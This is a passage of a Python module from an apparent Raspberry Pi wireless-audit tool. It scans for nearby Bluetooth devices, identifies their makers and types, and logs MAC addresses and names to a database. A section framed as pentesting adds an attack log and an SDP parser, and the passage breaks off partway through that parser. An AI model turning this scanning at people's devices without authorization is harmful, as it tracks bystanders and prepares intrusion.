#!/usr/bin/env python3
"""
bt_ops.py - Operaciones Bluetooth (BR/EDR + LE) para PiScan.

Patron: salida JSON por stdout (1 solo JSON, nunca prints de debug).
Marco: laboratorio controlado / pruebas autorizadas. Mismo contrato
C <-> Python que wifi_ops.py.

Comandos:
  up    [iface]                      -> rfkill unblock + btmgmt power on
  down  [iface]                      -> btmgmt power off
  info  [iface]                      -> datos del controller (btmgmt info)
  scan  [iface] [seconds] [mode]     -> mode: dual (default) | le | classic
                                       devuelve lista de dispositivos vistos
  show  [iface] <mac>                -> bluetoothctl info <mac>, enriquecido

iface default: hci1 (USB RTL8821CU).
"""
import sys, os, re, json, subprocess, time, threading, random, datetime

# Rutas absolutas de los binarios usados (coherente con wifi_ops.py / sudoers).
BTMGMT       = "/usr/bin/btmgmt"
BLUETOOTHCTL = "/usr/bin/bluetoothctl"
HCICONFIG    = "/usr/bin/hciconfig"
HCITOOL      = "/usr/bin/hcitool"
SDPTOOL      = "/usr/bin/sdptool"
L2PING       = "/usr/bin/l2ping"
BTMON        = "/usr/bin/btmon"
TIMEOUT_BIN  = "/usr/bin/timeout"
STDBUF_BIN   = "/usr/bin/stdbuf"
RFKILL_BIN   = "/usr/sbin/rfkill"
SUDO         = "/usr/bin/sudo"

DEFAULT_IFACE = "hci1"


def _run(cmd, timeout=15):
    """Importante: pasamos stdin=DEVNULL siempre. Bajo systemd el servicio
    corre con stdin cerrado y `btmgmt` (bluez 5.82) tiene un bug donde se
    cuelga indefinidamente si no detecta un stdin TTY o un pipe abierto.
    Confirmado 2026-10-27 reproduciendo `btmgmt info` con DEVNULL -> timeout.
    hciconfig no sufre ese bug, por eso power_on/off usan hciconfig."""
    try:
        return subprocess.run(cmd, capture_output=True, text=True,
                              timeout=timeout, stdin=subprocess.DEVNULL)
    except Exception:
        return None


def _iface_index(iface):
    """hci0 -> 0, hci1 -> 1. Devuelve str para pasarlo a btmgmt --index."""
    m = re.match(r'^hci(\d+)$', (iface or '').strip().lower())
    if not m:
        raise ValueError(f"iface invalido: {iface!r} (esperado hci<N>)")
    return m.group(1)


# ---------------------------------------------------------------------------
# OUI -> fabricante (duplicado minimal del helper de wifi_ops.py). Se podria
# refactorizar a app/oui.py mas adelante; por ahora, autonomia completa.
# ---------------------------------------------------------------------------

_OUI_BUILTIN_BT = {
    "B827EB": "Raspberry Pi",
    "DCA632": "Raspberry Pi",
    "E45F01": "Raspberry Pi",
    "FC221C": "Realtek",       # dongle USB BT que usa PiScan (hci1)
    "001A7D": "Realtek",
    "D83ADD": "Raspberry Pi",
}


def _oui_file():
    for p in (os.path.expanduser("~/piscanlvgl/data/oui.txt"),
              "/usr/share/ieee-data/oui.txt", "/var/lib/ieee-data/oui.txt",
              "/usr/share/aircrack-ng/airodump-ng-oui.txt",
              "/usr/share/wireshark/manuf", "/usr/share/misc/oui.txt"):
        if os.path.exists(p):
            return p
    return None


def _mac_is_random(mac):
    """True si el 1er octeto tiene el bit 0x02 (locally administered). Las
    MAC BLE "random" tipicas (iOS/Android por privacidad) caen aqui. Ningun
    OUI las resuelve, asi que las etiquetamos aparte."""
    try:
        o1 = int(mac.split(':')[0], 16)
        return bool(o1 & 0x02)
    except Exception:
        return False


def _resolve_vendors(prefixes):
    """prefixes: set de prefijos 6-hex en mayuscula sin separador.
    Devuelve {prefijo: fabricante}, best-effort."""
    result = {}
    want = set(p.upper() for p in prefixes if p)
    for p in want:
        if p in _OUI_BUILTIN_BT:
            result[p] = _OUI_BUILTIN_BT[p]
    path = _oui_file()
    if path and want:
        remaining = want - set(result.keys())
        if remaining:
            try:
                with open(path, "r", errors="replace") as f:
                    for line in f:
                        m = re.match(r'^\s*([0-9A-Fa-f]{2})[:-]([0-9A-Fa-f]{2})[:-]([0-9A-Fa-f]{2})', line)
                        if not m:
                            continue
                        pref = (m.group(1) + m.group(2) + m.group(3)).upper()
                        if pref in remaining and pref not in result:
                            rest = line[m.end():].replace('(hex)', '').strip().strip('\t').strip()
                            vendor = re.split(r'\t|  +', rest)[0].strip() if rest else ''
                            if vendor:
                                result[pref] = vendor[:24]
                        if len(result) == len(want):
                            break
            except Exception:
                pass
    return result


def _device_type(icon, cls, appearance, vendor, name=""):
    """Mapea icon/CoD/Appearance/vendor/name a una etiqueta corta del tipo
    de dispositivo (PC, Celular, Audio, Teclado, Mouse, TV, Reloj, ...).
    Nunca lanza; devuelve '?' si no hay pista suficiente."""
    ic = (icon or "").lower().strip()
    # 1) Bluez ya decidió por nosotros via `Icon:` -> es la pista más fiable.
    if ic:
        if "computer" in ic:         return "PC"
        if ic == "phone":            return "Celular"
        if ic.startswith("audio"):   return "Audio"
        if ic == "video-display":    return "TV"
        if ic.startswith("camera"):  return "Camara"
        if ic == "printer":          return "Impresora"
        if "keyboard" in ic:         return "Teclado"
        if "mouse" in ic:            return "Mouse"
        if "gaming" in ic:           return "Gamepad"
        if "tablet" in ic:           return "Tablet"
        if "watch" in ic:            return "Reloj"
        if "network" in ic:          return "Red"
    # 2) Class of Device (BR/EDR). Formato "0x002a010c".
    try:
        c = int(cls, 16) if isinstance(cls, str) else int(cls or 0)
    except Exception:
        c = 0
    if c:
        major = (c >> 8) & 0x1F
        minor = (c >> 2) & 0x3F
        if major == 1:
            return {1:"Desktop",2:"Server",3:"Laptop",4:"PDA",5:"PDA",6:"Wearable"}.get(minor, "PC")
        if major == 2:
            return {1:"Celular",2:"Cordless",3:"Celular",4:"Modem",5:"ISDN"}.get(minor, "Celular")
        if major == 3: return "Red"
        if major == 4:
            audio_map = {1:"Headset",2:"Hands-free",4:"Microfono",5:"Parlante",
                         6:"Audifonos",7:"Audio",8:"Auto",9:"Set-top",
                         10:"HiFi",11:"VCR",12:"Camara",13:"Camcorder",
                         14:"Monitor",15:"TV",16:"Videoconf",18:"Gamepad"}
            return audio_map.get(minor, "Audio")
        if major == 5:
            if c & 0x40: return "Teclado"
            if c & 0x20: return "Mouse"
            return {1:"Joystick",2:"Gamepad",3:"Remote",4:"Sensor",
                    5:"Tablet",6:"Lector"}.get(minor, "Perif.")
        if major == 6:
            return "Impresora" if minor & 0x20 else "Imagen"
        if major == 7:
            return {1:"Reloj",2:"Pager",3:"Ropa",4:"Casco",5:"Gafas"}.get(minor, "Wearable")
        if major == 8: return "Juguete"
        if major == 9: return "Salud"
    # 3) Appearance BLE: puede venir como "Generic Watch (0x00C0)" o "0x00C0".
    try:
        ap = 0
        if appearance:
            m = re.search(r'0x([0-9A-Fa-f]+)', str(appearance))
            if m: ap = int(m.group(1), 16)
    except Exception:
        ap = 0
    if ap:
        cat = ap >> 6  # 10-bit category
        if cat == 1: return "Celular"
        if cat == 2: return "PC"
        if cat in (3, 4): return "Reloj"
        if cat == 5: return "Reloj"
        if cat == 6: return "Pantalla"
        if cat == 7: return "Control"
        if cat == 8: return "Gafas"
        if cat == 10: return "Llavero"
        if cat == 11: return "Media"
        if cat in (12, 13): return "Scanner"
        if cat == 15: return "HID"
        if cat >> 4 == 0x0F:  # HID subrange 0x03C0-0x03FF
            sub = ap & 0x3F
            return {1:"Teclado",2:"Mouse",3:"Joystick",4:"Gamepad",
                    5:"Tablet",6:"Lector",7:"Pluma",8:"Scanner"}.get(sub, "HID")
    # 4) Appearance textual (si viene como "Generic Watch")
    aps = (appearance or "").lower()
    if "watch" in aps: return "Reloj"
    if "phone" in aps: return "Celular"
    if "keyboard" in aps: return "Teclado"
    if "mouse" in aps: return "Mouse"
    if "computer" in aps: return "PC"
    # 5) Heuristica muy debil por vendor+name
    v = (vendor or "").lower()
    n = (name or "").lower()
    if any(x in v for x in ("samsung","xiaomi","huawei","oneplus","motorola","oppo","realme")):
        return "Celular?"
    if any(x in v for x in ("jbl","harman","bose","sony corporation","beats")):
        return "Audio?"
    if any(x in v for x in ("hewlett","hp inc","canon","epson","brother")):
        return "Impr.?"
    if any(x in n for x in ("airpods","buds","headphone","headset","speaker","soundbar","flip","charge")):
        return "Audio?"
    if any(x in n for x in ("laptop","macbook","desktop","workstation")):
        return "PC?"
    if any(x in n for x in ("iphone","galaxy","pixel","phone")):
        return "Celular?"
    if any(x in n for x in ("tv ","chromecast","shield","fire tv","roku")):
        return "TV?"
    return "?"


def _vendor_for(mac):
    """Devuelve el fabricante por OUI o una etiqueta especial para MAC
    aleatorias. '' si no se puede resolver."""
    if not mac or len(mac) < 8:
        return ""
    if _mac_is_random(mac):
        return "(aleatoria)"
    prefix = mac.replace(":", "").upper()[:6]
    v = _resolve_vendors({prefix}).get(prefix, "")
    return v


# ---------------------------------------------------------------------------
# Power / rfkill
# ---------------------------------------------------------------------------

def power_on(iface=DEFAULT_IFACE):
    """Enciende el controller: rfkill unblock + hciconfig <iface> up.
    Usamos hciconfig en vez de btmgmt porque btmgmt (bluez 5.82) se cuelga
    con stdin cerrado (ver _run). hciconfig es idempotente y responde en ms.
    Devuelve (ok, msg)."""
    _iface_index(iface)  # valida formato
    # 1) rfkill unblock (soft block). Si no esta instalado, se omite.
    if os.path.exists(RFKILL_BIN):
        _run([SUDO, '-n', RFKILL_BIN, 'unblock', 'bluetooth'], timeout=5)
    # 2) up via hciconfig (requiere sudo con NOPASSWD).
    r = _run([SUDO, '-n', HCICONFIG, iface, 'up'], timeout=5)
    if r is None:
        return False, "hciconfig up: sin respuesta (timeout)"
    out = (r.stdout or '') + (r.stderr or '')
    if r.returncode != 0 or 'Operation not permitted' in out or 'Can\'t' in out:
        return False, f"hciconfig {iface} up fallo: {out.strip()[:200]}"
    return True, "powered on"


def power_off(iface=DEFAULT_IFACE):
    _iface_index(iface)
    r = _run([SUDO, '-n', HCICONFIG, iface, 'down'], timeout=5)
    if r is None:
        return False, "hciconfig down: sin respuesta (timeout)"
    return (r.returncode == 0), (r.stdout or r.stderr or '').strip()[:200]


def ctl_info(iface=DEFAULT_IFACE):
    """Datos del controller: address, UP/DOWN, flags. hciconfig -a es
    estable con stdin=DEVNULL (btmgmt info se cuelga ahi). Mantiene las
    mismas claves del return (iface, address, powered, raw) por compat."""
    _iface_index(iface)
    r = _run([SUDO, '-n', HCICONFIG, iface, '-a'], timeout=5)
    if r is None or r.returncode != 0:
        return None
    text = r.stdout or ''
    data = {"iface": iface, "raw": text.strip()[:600]}
    m = re.search(r'BD Address:\s+([0-9A-Fa-f:]{17})', text)
    if m: data["address"] = m.group(1)
    data["powered"] = ('UP RUNNING' in text) or ('\n\tUP ' in text)
    return data


# ---------------------------------------------------------------------------
# Parsers (pura logica, testeables sin tocar hardware)
# ---------------------------------------------------------------------------

_RX_ANSI = re.compile(r'\x1b\[[0-9;]*[A-Za-z]')

_RX_DEV_FOUND = re.compile(
    r'^hci\d+\s+dev_found:\s+'
    r'(?P<mac>[0-9A-Fa-f:]{17})\s+'
    r'type\s+(?P<type>\S+(?:\s+\S+)?)'    # \S+ para que "BR/EDR" entre entero
    r'(?:\s+rssi\s+(?P<rssi>-?\d+))?'
    r'(?:\s+flags\s+0x[0-9A-Fa-f]+)?'
)
_RX_AD_NAME        = re.compile(r'\bname\s+(?:complete\s+)?[\'"]?([^\'"\r\n]+?)[\'"]?\s*$')
_RX_AD_TX_POWER    = re.compile(r'\btx\s*power\s+(-?\d+)', re.I)
_RX_AD_UUID        = re.compile(r'UUID[^0-9A-Fa-f]+([0-9A-Fa-f]{4,8}(?:-[0-9A-Fa-f]{4}){0,3}-?[0-9A-Fa-f]{0,12})')
_RX_AD_MANUF       = re.compile(r'manufacturer(?:\s+specific)?\s+data\s+([0-9A-Fa-f ]+)', re.I)
_RX_AD_APPEARANCE  = re.compile(r'\bappearance\s+(?:0x)?([0-9A-Fa-f]+)', re.I)

# Eventos de bluetoothctl interactivo (btmgmt se cuelga con stdin=DEVNULL, por
# eso scan() usa bluetoothctl en lugar de btmgmt find).
_RX_BCTL_NEW   = re.compile(r'\[NEW\]\s+Device\s+([0-9A-F:]{17})\s+(.*)$')
_RX_BCTL_DEL   = re.compile(r'\[DEL\]\s+Device\s+([0-9A-F:]{17})')
_RX_BCTL_CHG_R = re.compile(r'\[CHG\]\s+Device\s+([0-9A-F:]{17})\s+RSSI(?:\s+is\s+now)?:[^\(]*\((-?\d+)\)')
_RX_BCTL_CHG_N = re.compile(r'\[CHG\]\s+Device\s+([0-9A-F:]{17})\s+Name:\s+(.+?)\s*$')
_RX_BCTL_LIST  = re.compile(r'^Device\s+([0-9A-F:]{17})\s+(.*)$')


def parse_btmgmt_find(text):
    """Parsea el stdout de `btmgmt --index N find [-l|-b]`. Devuelve una lista
    de dicts con las claves: mac, addr_type, rssi, name, tx_power, uuids,
    manufacturer_data, appearance. Nunca lanza; devuelve [] si no hay nada."""
    devices = {}
    cur = None
    for raw in (text or '').splitlines():
        line = raw.rstrip()
        m = _RX_DEV_FOUND.match(line)
        if m:
            mac = m.group('mac').upper()
            type_raw = (m.group('type') or '').strip()
            # type puede ser "BR/EDR", "LE Public", "LE Random", "LE"
            if 'BR/EDR' in type_raw:
                addr_type = 'public'  # BR/EDR siempre publica
                kind = 'classic'
            elif 'Random' in type_raw:
                addr_type = 'random'
                kind = 'le'
            elif 'LE' in type_raw:
                addr_type = 'public'
                kind = 'le'
            else:
                addr_type = ''
                kind = ''
            rssi = m.group('rssi')
            dev = devices.get(mac) or {
                "mac": mac, "addr_type": addr_type, "kind": kind,
                "rssi": None, "name": "", "tx_power": None,
                "uuids": [], "manufacturer_data": "", "appearance": ""
            }
            if rssi is not None:
                try: dev["rssi"] = int(rssi)
                except Exception: pass
            # si lo visto antes era classic y ahora llega LE (o viceversa), marcamos dual
            if dev.get("kind") and kind and dev["kind"] != kind:
                dev["kind"] = "dual"
            else:
                dev["kind"] = dev.get("kind") or kind
            devices[mac] = dev
            cur = dev
            continue
        if cur is None:
            continue
        # Lineas de datos del ultimo dispositivo:
        mn = _RX_AD_NAME.search(line)
        if mn and 'name' in line.lower() and 'uuid' not in line.lower():
            # evitamos pisar un nombre bueno con uno peor
            new_name = mn.group(1).strip()
            if new_name and (not cur["name"] or len(new_name) > len(cur["name"])):
                cur["name"] = new_name[:96]
        mtx = _RX_AD_TX_POWER.search(line)
        if mtx:
            try: cur["tx_power"] = int(mtx.group(1))
            except Exception: pass
        ma = _RX_AD_APPEARANCE.search(line)
        if ma:
            try:
                cur["appearance"] = f"0x{int(ma.group(1), 16):04X}"
            except Exception:
                pass
        mu = _RX_AD_UUID.search(line)
        if mu:
            uu = mu.group(1).lower()
            if uu and uu not in cur["uuids"]:
                cur["uuids"].append(uu)
        md = _RX_AD_MANUF.search(line)
        if md:
            hexd = re.sub(r'\s+', '', md.group(1))
            if hexd:
                cur["manufacturer_data"] = hexd[:200]
    return list(devices.values())


_RX_BCTL_HEADER       = re.compile(r'^Device\s+([0-9A-Fa-f:]{17})\s*(?:\(([^)]+)\))?')
_RX_BCTL_KV           = re.compile(r'^\s*([A-Za-z][A-Za-z\s./]+?):\s*(.+?)\s*$')
_RX_BCTL_UUID         = re.compile(r'^\s*UUID:\s+([^\s(]+(?:\s+[^\s(]+)*)\s*\(([0-9A-Fa-f-]+)\)')
_RX_BCTL_MANUF_KEY    = re.compile(r'^\s*ManufacturerData\.Key:\s*0x([0-9A-Fa-f]+)')


def _is_mac_placeholder(s, mac):
    """bluez usa la MAC con guiones ('AA-BB-CC-DD-EE-FF') como Name/Alias cuando
    no hay nombre real. No es un nombre util; lo descartamos para que no quede
    guardado en la DB ni mostrado en la UI."""
    if not s:
        return False
    if re.fullmatch(r'[0-9A-Fa-f]{2}(?:[-:][0-9A-Fa-f]{2}){5}', s):
        return True
    if mac and s.upper() == mac.upper().replace(':', '-'):
        return True
    return False


def parse_bluetoothctl_info(text):
    """Parsea la salida de `bluetoothctl info <mac>`. Devuelve dict con
    name, alias, appearance, icon, rssi, uuids, manufacturer_key, class, etc."""
    d = {"mac": "", "addr_type": "", "name": "", "alias": "",
         "appearance": "", "icon": "", "rssi": None, "tx_power": None,
         "class": "", "paired": False, "trusted": False, "connected": False,
         "uuids": [], "manufacturer_key": ""}
    for raw in (text or '').splitlines():
        mh = _RX_BCTL_HEADER.match(raw)
        if mh:
            d["mac"] = mh.group(1).upper()
            d["addr_type"] = (mh.group(2) or '').strip().lower()
            continue
        mu = _RX_BCTL_UUID.match(raw)
        if mu:
            label = mu.group(1).strip()
            uuid  = mu.group(2).strip().lower()
            if uuid not in [x.split('|', 1)[0] for x in d["uuids"]]:
                d["uuids"].append(f"{uuid}|{label}" if label else uuid)
            continue
        mk = _RX_BCTL_MANUF_KEY.match(raw)
        if mk:
            d["manufacturer_key"] = f"0x{mk.group(1).lower()}"
            continue
        mv = _RX_BCTL_KV.match(raw)
        if mv:
            k = mv.group(1).strip().lower()
            v = mv.group(2).strip()
            if k == 'name':
                if not _is_mac_placeholder(v, d.get("mac")):
                    d["name"] = v[:96]
            elif k == 'alias':
                if not _is_mac_placeholder(v, d.get("mac")):
                    d["alias"] = v[:96]
            elif k == 'appearance':
                d["appearance"] = v[:48]
            elif k == 'icon':
                d["icon"] = v[:32]
            elif k == 'class':
                d["class"] = v[:16]
            elif k == 'rssi':
                # Formato bluez: "0xffffffbc (-68)". Preferimos el valor en
                # parentesis (int con signo). Fallback a parseo directo.
                m2 = re.search(r'\((-?\d+)\)', v)
                try:
                    d["rssi"] = int(m2.group(1)) if m2 else int(v)
                except Exception:
                    pass
            elif k == 'txpower':
                m2 = re.search(r'\((-?\d+)\)', v)
                try:
                    d["tx_power"] = int(m2.group(1)) if m2 else int(v)
                except Exception:
                    pass
            elif k == 'paired':
                d["paired"] = (v.lower() == 'yes')
            elif k == 'trusted':
                d["trusted"] = (v.lower() == 'yes')
            elif k == 'connected':
                d["connected"] = (v.lower() == 'yes')
    return d


def merge_bt_devices(base, info):
    """Enriquece un device descubierto por btmgmt con los datos de
    bluetoothctl info (nombre completo, UUIDs resueltos, class, icon,
    appearance textual). Nunca pisa valores no vacios de base con vacios
    de info, salvo que info traiga algo nuevo."""
    out = dict(base)
    if not info:
        return out
    name = info.get("name") or info.get("alias") or ""
    if name and (not out.get("name") or len(name) > len(out.get("name") or "")):
        out["name"] = name
    for k in ("appearance", "icon", "class", "manufacturer_key"):
        if info.get(k) and not out.get(k):
            out[k] = info[k]
    if info.get("rssi") is not None and out.get("rssi") is None:
        out["rssi"] = info["rssi"]
    # UUIDs: fusionamos (bluetoothctl los trae con etiqueta humana). Si la
    # misma UUID existe sin label en base y en info viene con label, la
    # version con label gana (es mas util en la UI/DB).
    extra = info.get("uuids") or []
    if extra:
        out_uuids = list(out.get("uuids", []))
        by_key = {u.split('|', 1)[0]: i for i, u in enumerate(out_uuids)}
        for u in extra:
            key = u.split('|', 1)[0]
            if key in by_key:
                existing = out_uuids[by_key[key]]
                if '|' not in existing and '|' in u:
                    out_uuids[by_key[key]] = u
            else:
                out_uuids.append(u)
                by_key[key] = len(out_uuids) - 1
        out["uuids"] = out_uuids
    return out


# ---------------------------------------------------------------------------
# Scan
# ---------------------------------------------------------------------------

def parse_bluetoothctl_scan(text):
    """Parsea el stdout de una sesion interactiva de bluetoothctl mientras
    corre `scan on`. Reconoce eventos `[NEW] Device MAC [name]`, `[CHG] Device
    MAC RSSI: 0x.. (-N)`, `[CHG] Device MAC Name: X`, `[DEL] Device MAC`, y
    el listado final del comando `devices` (`Device MAC Name`). Devuelve lista
    de dicts; nunca lanza."""
    devs = {}
    for raw_line in (text or '').splitlines():
        line = _RX_ANSI.sub('', raw_line).strip()

        m = _RX_BCTL_NEW.match(line)
        if m:
            mac = m.group(1).upper()
            name = (m.group(2) or '').strip()
            d = devs.setdefault(mac, {
                "mac": mac, "addr_type": "", "kind": "le",
                "rssi": None, "name": "", "tx_power": None,
                "uuids": [], "manufacturer_data": "", "appearance": "",
            })
            # Si el "name" viene como MAC con guiones (bluez placeholder), descartar.
            if name and name.upper() != mac.replace(':', '-') and not re.match(r'^[0-9A-F:-]+$', name):
                d["name"] = name[:96]
            continue

        m = _RX_BCTL_CHG_R.match(line)
        if m:
            mac = m.group(1).upper()
            try:
                rssi = int(m.group(2))
            except Exception:
                rssi = None
            d = devs.setdefault(mac, {"mac": mac, "addr_type": "", "kind": "le",
                                      "rssi": None, "name": "", "tx_power": None,
                                      "uuids": [], "manufacturer_data": "",
                                      "appearance": ""})
            if rssi is not None:
                d["rssi"] = rssi
            continue

        m = _RX_BCTL_CHG_N.match(line)
        if m:
            mac = m.group(1).upper()
            name = m.group(2).strip()
            d = devs.setdefault(mac, {"mac": mac, "addr_type": "", "kind": "le",
                                      "rssi": None, "name": "", "tx_power": None,
                                      "uuids": [], "manufacturer_data": "",
                                      "appearance": ""})
            if name and not re.match(r'^[0-9A-F:-]+$', name):
                d["name"] = name[:96]
            continue

        m = _RX_BCTL_DEL.match(line)
        if m:
            # un peer salio de rango; lo dejamos (ya lo vimos). no-op.
            continue

        m = _RX_BCTL_LIST.match(line)
        if m:
            mac = m.group(1).upper()
            name = (m.group(2) or '').strip()
            # Si lo que sigue a la MAC es '(public)' / '(random)' etc., es el
            # header de un bloque `info`, no una entrada del comando `devices`;
            # el bloque lo procesa _split_info_blocks y no debemos tomar name aqui.
            if name.startswith('(') and name.endswith(')'):
                continue
            d = devs.setdefault(mac, {"mac": mac, "addr_type": "", "kind": "le",
                                      "rssi": None, "name": "", "tx_power": None,
                                      "uuids": [], "manufacturer_data": "",
                                      "appearance": ""})
            if not d["name"] and name and name.upper() != mac.replace(':', '-'):
                if not re.match(r'^[0-9A-F:-]+$', name):
                    d["name"] = name[:96]
            continue
    return list(devs.values())


def _bd_address(iface):
    """iface -> BD address (ej 'B8:27:EB:B3:66:DB'), o '' si no se puede."""
    info = ctl_info(iface)
    return info.get("address", "") if info else ""


def _split_info_blocks(text):
    """Separa el stream de bluetoothctl interactivo en bloques `info <mac>`.
    Cada vez que vemos una linea "Device MAC (type)" abrimos bloque; cerramos
    al proximo header o al prompt "[bluetooth]#". Retorna {MAC: texto_bloque}.
    Util para enriquecer el scan con los datos que vienen de `info <mac>`
    (RSSI, UUIDs, appearance, icon, class) mientras el scan sigue activo."""
    blocks = {}
    cur_mac = None
    cur_lines = []
    for raw in (text or '').splitlines():
        line = _RX_ANSI.sub('', raw)
        m = re.match(r'^Device\s+([0-9A-F:]{17})\s*\(', line)
        if m:
            if cur_mac:
                blocks[cur_mac] = '\n'.join(cur_lines)
            cur_mac = m.group(1).upper()
            cur_lines = [line]
            continue
        # cierre si llegamos a un prompt o a un nuevo comando
        if line.lstrip().startswith('[bluetooth]#') or line.lstrip().startswith('[CHG]') or line.lstrip().startswith('[NEW]'):
            if cur_mac:
                blocks[cur_mac] = '\n'.join(cur_lines)
                cur_mac = None
                cur_lines = []
            continue
        if cur_mac:
            cur_lines.append(line)
    if cur_mac:
        blocks[cur_mac] = '\n'.join(cur_lines)
    return blocks


def scan(iface=DEFAULT_IFACE, seconds=10, mode='dual'):
    """Barrido de dispositivos BT con bluetoothctl interactivo. Devuelve
    (devices, err).

    Importante: NO usamos `btmgmt find` porque btmgmt 5.82 se cuelga cuando
    stdin es /dev/null (confirmado el 2026-10-27 bajo systemd). bluetoothctl
    por D-Bus no sufre ese bug y ademas da RSSI + nombres resueltos cuando
    el scan sigue activo."""
    try:
        _iface_index(iface)
    except ValueError as e:
        return None, str(e)
    seconds = max(2, min(int(seconds or 10), 120))
    mode = (mode or 'dual').lower()

    ok, msg = power_on(iface)
    if not ok:
        return None, f"No se pudo encender el controller: {msg}"

    bd = _bd_address(iface)
    if not bd:
        return None, f"No se pudo obtener BD address de {iface}"

    # bluetoothctl interactivo con reader thread para capturar el stream mientras
    # inyectamos comandos. Flow:
    #   select <bd> + scan on + sleep (seconds-2)
    #   -> snapshot de MACs vistas ([NEW] events)
    #   -> info <mac> por cada (asi vienen RSSI/UUIDs/appearance/class/addr_type)
    #   sleep (0.1 por mac, floor 1s)
    #   scan off + devices + quit
    proc = subprocess.Popen(
        [BLUETOOTHCTL],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT, text=True, bufsize=1,
    )
    lines = []
    stop = threading.Event()

    def _reader():
        try:
            for line in iter(proc.stdout.readline, ''):
                if stop.is_set():
                    break
                lines.append(line)
        except Exception:
            pass

    t = threading.Thread(target=_reader, daemon=True)
    t.start()

    try:
        proc.stdin.write(f"select {bd}\n")
        proc.stdin.write("scan on\n")
        proc.stdin.flush()
        pre = max(1, seconds - 2)
        time.sleep(pre)

        # Snapshot de MACs vistas por [NEW] events hasta el momento.
        snapshot = ''.join(lines)
        clean = _RX_ANSI.sub('', snapshot)
        macs = []
        seen = set()
        for m in re.finditer(r'\[NEW\]\s+Device\s+([0-9A-F:]{17})', clean):
            mm = m.group(1).upper()
            if mm not in seen:
                seen.add(mm); macs.append(mm)
        macs = macs[:48]   # tope duro para no abusar

        # Pedir info de cada MAC mientras el scan sigue activo (RSSI fresca).
        for m in macs:
            proc.stdin.write(f"info {m}\n")
        proc.stdin.flush()
        time.sleep(max(1.0, 0.12 * len(macs)))

        proc.stdin.write("scan off\n")
        proc.stdin.write("devices\n")
        proc.stdin.flush()
        time.sleep(0.4)
        proc.stdin.write("quit\n")
        proc.stdin.flush()
        try:
            proc.wait(timeout=seconds + 10)
        except subprocess.TimeoutExpired:
            proc.kill()
    except Exception as e:
        try: proc.kill()
        except Exception: pass
        stop.set(); t.join(timeout=1)
        return None, f"bluetoothctl fallo: {e}"

    stop.set()
    t.join(timeout=1)
    out = ''.join(lines)

    # 1) MACs + name + eventos del scan.
    found = parse_bluetoothctl_scan(out)
    by_mac = {d["mac"]: d for d in found}

    # 2) Enriquecer con los bloques `info` (RSSI/UUIDs/appearance/class/icon/addr_type).
    for mac, block in _split_info_blocks(out).items():
        info = parse_bluetoothctl_info(block)
        if mac in by_mac:
            by_mac[mac] = merge_bt_devices(by_mac[mac], info)
            # addr_type del info: si venia vacio en el scan, lo tomamos.
            if info.get("addr_type") and not by_mac[mac].get("addr_type"):
                by_mac[mac]["addr_type"] = info["addr_type"]
            # kind: si es "random" o "public" tipico BLE, kind=le; "br/edr" -> classic
            at = (info.get("addr_type") or '').lower()
            if 'br' in at:
                by_mac[mac]["kind"] = "classic"
            elif at in ("public", "random"):
                by_mac[mac]["kind"] = "le"
        else:
            # Device solo visto en info (raro); lo agregamos.
            base = {"mac": mac, "addr_type": "", "kind": "le", "rssi": None,
                    "name": "", "tx_power": None, "uuids": [],
                    "manufacturer_data": "", "appearance": ""}
            by_mac[mac] = merge_bt_devices(base, info)

    devices = list(by_mac.values())
    for d in devices:
        d["vendor"] = _vendor_for(d["mac"])
        d["type"] = _device_type(d.get("icon",""), d.get("class",""),
                                 d.get("appearance",""), d.get("vendor",""),
                                 d.get("name",""))

    # Log en DB (best-effort; nunca tumba el scan).
    log_bluetooth_batch(iface, mode, devices)
    return devices, None


# ---------------------------------------------------------------------------
# Logging a DB (best-effort)
# ---------------------------------------------------------------------------

def _db_import():
    """Patron del repo: inyectar app/ en sys.path y usar SQLAlchemy."""
    try:
        base = os.path.expanduser("~/piscanlvgl/app")
        if base not in sys.path:
            sys.path.insert(0, base)
        from db.models import get_session, BluetoothLog
        return get_session, BluetoothLog
    except Exception:
        return None, None


def log_bluetooth_batch(iface, mode, devices):
    if not devices:
        return
    get_session, BluetoothLog = _db_import()
    if get_session is None:
        return
    try:
        s = get_session()
        for d in devices:
            uuids_str = ",".join(u for u in d.get("uuids") or [])[:1800]
            services_label = []
            # bluetoothctl UUIDs vienen como "uuid|Label"; preferimos labels
            for u in d.get("uuids") or []:
                parts = u.split('|', 1)
                services_label.append(parts[1] if len(parts) == 2 else parts[0])
            svc = ", ".join(services_label)[:1800]
            s.add(BluetoothLog(
                scan_type=mode,
                iface=iface,
                mac=d.get("mac"),
                addr_type=d.get("addr_type") or None,
                name=(d.get("name") or None),
                vendor=d.get("vendor") or None,
                rssi=d.get("rssi"),
                tx_power=d.get("tx_power"),
                appearance=(d.get("appearance") or None),
                cls=(d.get("class") or None),
                icon=(d.get("icon") or None),
                type_label=(d.get("type") or None),
                services=svc or uuids_str or None,
                manufacturer_data=(d.get("manufacturer_data")
                                   or d.get("manufacturer_key") or None),
                details=None,
            ))
        s.commit(); s.close()
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Pentesting / auditoria: SDP (BR/EDR) + GATT (LE) + L2ping (BR/EDR)
# Marco: SOLO redes y dispositivos propios o con autorizacion explicita.
# ---------------------------------------------------------------------------

def log_bt_attack(action, target_mac, result, details=None, target_name=None):
    """Inserta una fila en bluetooth_attack_log. Silencia fallos de DB."""
    try:
        base = os.path.expanduser("~/piscanlvgl/app")
        if base not in sys.path:
            sys.path.insert(0, base)
        from db.models import get_session, BluetoothAttackLog
        s = get_session()
        s.add(BluetoothAttackLog(
            action=(action or "")[:32],
            target_mac=(target_mac or "")[:24],
            target_name=(target_name or "")[:96] if target_name else None,
            result=(result or "")[:16],
            details=(details or "")[:1800] if details else None,
        ))
        s.commit(); s.close()
    except Exception:
        pass


_RX_SDP_RECORD = re.compile(r'^Service Name:\s*(.+?)\s*$')
_RX_SDP_RHANDLE = re.compile(r'^Service RecHandle:\s*(0x[0-9A-Fa-f]+)')
_RX_SDP_CLASS   = re.compile(r'^"?([^"]+)"?\s*\((0x[0-9A-Fa-f]+)\)')


def parse_sdptool_browse(text):
    """Parsea `sdptool browse <mac>`. Devuelve lista de servicios BR/EDR:
    [{name, rec_handle, classes:[(name,uuid16)]}]. Nunca lanza."""
    services = []
    cur = None
    in_classes = False
    for raw in (text or '').splitlines():
        line = raw.rstrip()
        m = _RX_SDP_RECORD.match(line.strip())
        if m:
            if cur: services.append(cur)
            cur = {"name": m.group(1).strip(), "rec_handle": "", "classes": []}
            in_classes = False
            continue
        if cur is None:
            continue
